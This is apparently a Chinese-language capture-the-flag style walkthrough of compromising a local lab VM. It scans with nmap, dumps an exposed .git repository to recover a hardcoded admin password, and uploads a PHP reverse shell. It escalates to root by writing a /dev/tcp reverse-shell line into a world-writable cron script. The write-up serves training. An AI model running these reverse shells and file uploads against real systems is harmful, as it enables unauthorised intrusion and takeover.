VB打开，选择桥接wifi模式，用探测查找网卡！发现IP：192.168.3.170

--------------------------------------------
--------------------------------------------
1、nmap 192.168.3.170 -p- -A

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   192.168.3.170:80/.git/


--------------------------------------------
--------------------------------------------
2、web信息收集

dirb http://192.168.3.170

http://192.168.3.170/.git/HEAD    ---git源码库？
http://192.168.3.170/admin.php    ----管理登录后台？
http://192.168.3.170/upload/    ----文件上传？？



--------------------------------------------
--------------------------------------------
3、管理后台爆破

http://192.168.3.170/admin.php
打开admin.php会得到一个包含用户名和密码字段的表单。看到一个表单直觉是SQL注入，但是没什么发现！


--------------------------------------------
--------------------------------------------
4、Git存储库

一些网站在生产中托管他们的版本控制存储库（例如.git/）。坏人可以使用工具下载/恢复存储库以访问您网站的源代码。现在检查您的网络服务器的配置，并确保它阻止访问这些文件夹。


nmap扫描发现了web站下的git目录，找到了一个Git存储库

https://github.com/internetwache/GitTools

proxychains git clone https://github.com/internetwache/GitTools.git
cd GitTools/


Dumper目录使用gitdumper工具：探索目录
./gitdumper.sh --help
[*] USAGE: http://target.tld/.git/ dest-dir [--git-dir=otherdir]

./gitdumper.sh http://192.168.3.170/.git/ dest-dir
--------------
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/3d/b5628b550f5c9c9f6f663cd158374035a6eaa0
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/cc/1ab96950f56d1fff0d1f006821cab6b6b0e249
[+] Downloaded: objects/a8/9a716b3c21d8f9fee38a0693afb22c75f1d31c
[+] Downloaded: objects/31/33d44be3eebe6c6761b50c6fdf5b7fb664c2d8
[+] Downloaded: objects/3d/8e9ce9093fc391845dd69b0436b258ac4a6387
[+] Downloaded: objects/f0/d95f54335626ce6c96522e0a9105780b3366c5
[+] Downloaded: objects/c0/951efcb330fc310911d714acf03b873aa9ab43
[+] Downloaded: objects/23/448969d5b347f8e91f8017b4d8ef6edf6161d8
[+] Downloaded: objects/e7/ba67226cda1ecc1bd3a2537f0be94343d448bb
--------------

使用gitdumper工具成功转储了git文件！Extractor目录进行提取：
./extractor.sh --help
[*] USAGE: extractor.sh GIT-DIR DEST-DIR


提取信息内容：
./extractor.sh ../Dumper/dest-dir ./dest-dir
------------
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: cc1ab96950f56d1fff0d1f006821cab6b6b0e249
[+] Found file: /root/Desktop/57/GitTools/Extractor/./dest-dir/0-cc1ab96950f56d1fff0d1f006821cab6b6b0e249/index.php
[+] Found commit: a89a716b3c21d8f9fee38a0693afb22c75f1d31c
[+] Found file: /root/Desktop/57/GitTools/Extractor/./dest-dir/1-a89a716b3c21d8f9fee38a0693afb22c75f1d31c/admin.php
[+] Found file: /root/Desktop/57/GitTools/Extractor/./dest-dir/1-a89a716b3c21d8f9fee38a0693afb22c75f1d31c/index.php
[+] Found commit: 3db5628b550f5c9c9f6f663cd158374035a6eaa0
[+] Found file: /root/Desktop/57/GitTools/Extractor/./dest-dir/2-3db5628b550f5c9c9f6f663cd158374035a6eaa0/admin.php
[+] Found file: /root/Desktop/57/GitTools/Extractor/./dest-dir/2-3db5628b550f5c9c9f6f663cd158374035a6eaa0/index.php
------------

在2-3db5628b550f5c9c9f6f663cd158374035a6eaa0目录下发现：
admin.php  commit-meta.txt  index.php

cat admin.php
第七行代码发现：
    if ($_POST['username'] == 'admin' && $_POST['password'] == 'st@mpch0rdt.ightiRu$glo0mappL3') {

用户名密码：
admin
st@mpch0rdt.ightiRu$glo0mappL3


--------------------------------------------
--------------------------------------------
5、getshell

访问：http://192.168.3.170/admin.php成功登录！

登录后发现了更多表格，标题为：添加新帖子和将站点添加到博客，找到了一个上传选项：

cp /usr/share/webshells/php/php-reverse-shell.php .

然后上传文件访问：
nc -vlp 1234
http://192.168.3.170/upload/php-reverse-shell.php

/bin/bash   ---反弹的shell是sh的，要进入bash
python3 -c 'import pty;pty.spawn("/bin/bash")'


--------------------------------------------
--------------------------------------------
6、内部信息收集

/usr/sbin/cron -f
/bin/sh -c /bin/bash /home/eric/backup.sh

--------------------------------------------
--------------------------------------------
7、提权

msfvenom -p cmd/unix/reverse_bash lhost=192.168.3.61 lport=6666 R

bash -c '0<&139-;exec 139<>/dev/tcp/192.168.3.61/6666;sh <&139 >&139 2>&139'

echo "0<&139-;exec 139<>/dev/tcp/192.168.3.61/6666;sh <&139 >&139 2>&139" > backup.sh

python3 -c 'import pty;pty.spawn("/bin/bash")'



--------------------------------------------
--------------------------------------------
8、root权限信息枚举

crpn -f   ---- ps -aux 进程底下执行
*/3 * * * * /bin/bash /home/eric/backup.sh   ---权限又是rwxrwxrwx


熟悉git：
https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/

https://www.freebuf.com/articles/web/267597.html

























































